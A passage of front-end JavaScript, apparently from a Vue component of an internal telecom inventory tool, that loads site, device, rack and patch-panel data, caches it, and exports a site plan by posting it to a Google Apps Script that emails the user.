									Object.assign(sites[siteid].devices[device.DEVICE_NIOSS_ID],nioss_data.data);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+device.DEVICE_NIOSS_ID)});
								loader(siteid,true,'device_info_'+device.DEVICE_NAME);
								fetch('/call/device/device_info',{'method':'POST','headers':headers,'body':JSON.stringify({'device':device.DEVICE_NAME}),}).then(function(resp){return resp.json()}).then(function(device_info){
									Object.assign(sites[siteid].devices[device.DEVICE_NIOSS_ID],device_info.data[0]);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'device_info_'+device.DEVICE_NAME)});
							});
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'devices_'+siteid)});
						loader(siteid,true,'site_rack_list_'+siteid);
						fetch('/call/device/site_rack_list',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(racks_data){let racks=racks_data.data;
							for(let rack of racks.filter(function(item){return !item.nioss_error})){
								sites[siteid].racks[rack.RACK_ID]=rack;
								loader(siteid,true,'get_nioss_object_'+rack.RACK_ID);
								fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:rack.RACK_ID,object:'rack'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
									Object.assign(sites[siteid].racks[rack.RACK_ID],nioss_data.data);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+rack.RACK_ID)});
							};
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'site_rack_list_'+siteid);});
						loader(siteid,true,'patch_panels_'+siteid);
						fetch('/call/device/patch_panels',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(plints_data){let plints=plints_data.data;
							let ppanels=plints;for(let pp of ppanels){ppanels=ppanels.concat(pp.children);};/*поднятие из топологии*/
							for(let pp of ppanels.filter(function(item){return !item.nioss_error})){
								sites[siteid].ppanels[pp.id]=pp;
								loader(siteid,true,'get_nioss_object_'+pp.id);
								fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:pp.id,object:'device'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
									Object.assign(sites[siteid].ppanels[pp.id],nioss_data.data);
								}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+pp.id)});
							};
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'patch_panels_'+siteid)});
						
						testLoadPL(siteid);
						
					}else{
						document.getElementById('btn_downloadPL').removeAttribute('disabled');
						document.getElementById('loader_downloadPL').style.display='none';
					};
				}).catch(function(err){console.log(err)}).finally(function(){});
				function testLoadPL(siteid){
					let timer=setTimeout(testLoad,100);
					function testLoad(){
						let counter={all:0,done:0};
						for(let load in sites[siteid].loads){
							counter.all++;
							if(sites[siteid].loads[load]){
								counter.done++;
							};
							console.log('siteid:'+siteid+' loads: all:'+counter.all+' done:'+counter.done);
						};
						if(counter.all==counter.done){
							clearTimeout(timer);
							downloadPL(preparePL(siteid));
							document.getElementById('btn_downloadPL').removeAttribute('disabled');
							document.getElementById('loader_downloadPL').style.display='none';
							alert('план-схема отправлена на '+username+'@mts.ru');
						}else{
							timer=setTimeout(testLoad,100);
						};
					};
				};
				function downloadPL(obj){
					fetch('https://script.google.com/macros/s/AKfycbxl1S7H0iftlsBt8Tx-gL0zE-qwbwSN4TsUBpPqdIe9uMWtwgHfNGXb/exec',{
						'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
						'body':JSON.stringify(obj)
					}).then(function(obj){}).catch(function(err){console.log(err)}).finally(function(){});
				};
				function preparePL(siteid){
					let title=sites[siteid].nodes[0].name+' '+new Date().toLocaleDateString()+' '+new Date().toLocaleTimeString()+' '+username;
					return {
						username:username,
						sitename:sites[siteid].nodes[0].name,
						address:sites[siteid].nodes[0].address,
						siteid:siteid,
						title:title,
						json:JSON.stringify({[siteid]:sites[siteid]}),
						html:'',
					};
				};
			},
			async loadEntrances(force=false){
				if (this.loading.entrances) return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.entrances)return;
					const cache=this.$cache.getItem(`site_entrance_list/${siteid}`);
					if(cache){
						this.responses.entrances = cache;
						return;
					};
				};
				this.loading.entrances=true;
				const response=await httpGet(buildUrl('site_entrance_list',{siteid}));
				this.$cache.setItem(`site_entrance_list/${siteid}`,response);
				this.responses.entrances=response;
				this.loading.entrances=false;
			},
			async loadDevices(force=false){
				if(this.loading.devices)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.devices)return;
					const cache=this.$cache.getItem(`devices/${siteid}`);
					if(cache){
						this.responses.devices=cache;
						return;
					};
				};
				this.loading.devices=true;
				const response=await httpGet(buildUrl('devices',{siteid}));
				this.$cache.setItem(`devices/${siteid}`,response);
				this.responses.devices=response;
				this.loading.devices=false;
			},
			async loadFloors(force=false){
				if(this.loading.floors)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.floors)return;
					const cache=this.$cache.getItem(`site_flat_list/${siteid}`);
					if(cache){
						this.responses.floors=cache;
						return;
					};
				};
				this.loading.floors=true;
				const response=await httpGet(buildUrl('site_flat_list',{siteid}));
				this.$cache.setItem(`site_flat_list/${siteid}`,response.data);
				this.responses.floors=response.data;
				this.loading.floors=false;
			},
			async loadRacks(force=false){
				if(this.loading.racks)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.racks) return;
					const cache=this.$cache.getItem(`site_rack_list/${siteid}`);
					if(cache){
						this.responses.racks=cache;
						return;
					};
				};
				this.loading.racks=true;
				const response=await httpGet(buildUrl('site_rack_list',{siteid}));
				this.$cache.setItem(`site_rack_list/${siteid}`,response);
				this.responses.racks=response;
				this.loading.racks=false;
			},
			async loadPlints(force=false){
				if(this.loading.plints)return;
				const siteid=this.site.id;
				if(!force){
					if(this.responses.plints)return;
					const cache=this.$cache.getItem(`patch_panels/without_tree/${siteid}`);
					if(cache){
						this.responses.plints=cache;
						return;
					};
				};
				this.loading.plints=true;
				const response=await httpGet(buildUrl('patch_panels',{siteid,without_tree:true}));
				this.$cache.setItem(`patch_panels/without_tree/${siteid}`,response);
				this.responses.plints=response;
				this.loading.plints=false;
			},
			refresh(){
				localStorage.clear();
				document.location.reload();
			},
		},
		beforeRouteEnter(to,from,next){
			const {name,params}=to;
			const isChild=name==='entrance';
			const isEmptyProps=!params.siteProp&&!params.entranceProp;
			if(isChild&&isEmptyProps){
				next({name:'search',params:{text:encodeURIComponent(`entrance/${params.entrance_id}`)}});
				return;
			};
			if(!params.siteProp){
				next({name:'search',params:{text:params.site_id}});
				return;
			};
			next();
		},
		beforeRouteUpdate(to,from,next){
			const {params}=to;
			const sameSiteId=to.params.site_id===this.site.id||to.params.site_id===this.site.node;
			if(!sameSiteId&&!params.siteProp){
				next({name:'search',params:{text:params.site_id}});
				return;
			};
			next();
		},
	});
	/*
	}else{console.log(document.title)};

}());
*/
